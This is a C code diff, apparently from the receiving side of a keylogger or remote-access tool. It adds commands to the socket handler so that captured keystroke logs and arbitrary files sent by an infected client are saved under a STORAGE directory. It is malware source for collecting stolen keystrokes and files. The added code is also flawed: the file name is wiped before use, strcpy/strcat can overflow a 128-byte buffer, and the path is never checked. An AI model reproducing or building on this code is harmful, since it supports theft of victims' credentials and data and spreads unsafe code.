@@ -311,6 +311,9 @@ void * getMessageController (void * vParam){
 	paramThread * param = (paramThread *)vParam;
 
 	unsigned char GETFILE = 0;
+	// 0 : biasa
+	// 1 : KEYLOG
+	// 2 : GET
 
 	FILE * fp;
 
@@ -320,9 +323,19 @@ void * getMessageController (void * vParam){
 		pass = read((param)->clientSocket, buffer, 1024 - 1);
 
 		if(pass > 0){
-			if(strcmp(buffer, "GETFILE") == 0) {
+			if(strcmp(buffer, "GETKEYLOGFILE") == 0) {
 				GETFILE = 1; memset(buffer, '\0', sizeof(buffer));
-				fp = fopen("log.txt", "w"); continue;
+				fp = fopen("STORAGE/log.txt", "w"); continue;
+			} else if(strcmp(buffer, "GETFILE") == 0) {
+				memset(buffer, '\0', sizeof(buffer));
+				pass = read((param)->clientSocket, buffer, 1024 - 1);
+				GETFILE = 2; memset(buffer, '\0', sizeof(buffer));
+				char buffer2[128] = {0};
+
+				strcpy(buffer2, "STORAGE/GET/");
+				strcat(buffer2, buffer);
+
+				fp = fopen(buffer2, "w"); continue;
 			} else if(strcmp(buffer, "ENDGETFILE") == 0) {
 				GETFILE = 0; memset(buffer, '\0', sizeof(buffer));
 				fclose(fp); fp = NULL; continue;
@@ -330,6 +343,7 @@ void * getMessageController (void * vParam){
 
 			if(GETFILE == 0) printf("%s\n", buffer);
 			else if(GETFILE == 1) {printf("%s\n", buffer); fputs(buffer, fp);}
+			else if(GETFILE == 2) {printf("%s\n", buffer); fputs(buffer, fp);}
 
 			memset(buffer, '\0', sizeof(buffer));
 		}else if(pass == 0){
